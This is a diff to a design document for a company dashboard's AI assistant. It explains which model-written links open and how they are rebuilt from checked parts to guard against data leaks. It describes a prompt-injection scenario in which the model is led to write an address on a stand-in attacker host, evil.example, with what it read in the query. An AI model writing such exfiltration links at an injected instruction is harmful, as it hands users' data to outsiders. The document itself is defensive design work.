@@ -35,7 +35,7 @@ only where the dashboard BUILT it, from parts it checked, to a place that is
 the company's. A key whose project is the company's opens its work item and a
 handle in the chart its seat, both app routes the dashboard writes; a
 reference, a commit or a repository opens the code host the company
-configured; and an address on a host the company configured (a code host,
+configured, under an owner it names where it names any; and an address on a host the company configured (a code host,
 Jira, Confluence, Mattermost) opens as it is rebuilt from what it names
 (`<host>/<owner>/<repo>/pull/14`), with no query, fragment or anything else
 the model wrote. Every other address, an app route the model spelled among
@@ -45,6 +45,11 @@ a prompt injection that has the model write `https://evil.example/?q=<what it
 read>`: a click there hands the words to the host's owner, where a click on a
 link the dashboard built carries only a validated name or number to the
 company's own place.
+
+**Deliberately, the assistant and the Inbox only.** Doclet pages, a work
+item's description and comments read anywhere but the Inbox still open any
+safe address as written (`links: "anchor"`); whether those surfaces read
+`checked` too is an open question for the owner, not a gap in this record.
 
 **A record carries the key prose writes it by.** `EntityCard.key` is a task's
 key or a project's, set from the record by its read's spec, never guessed from
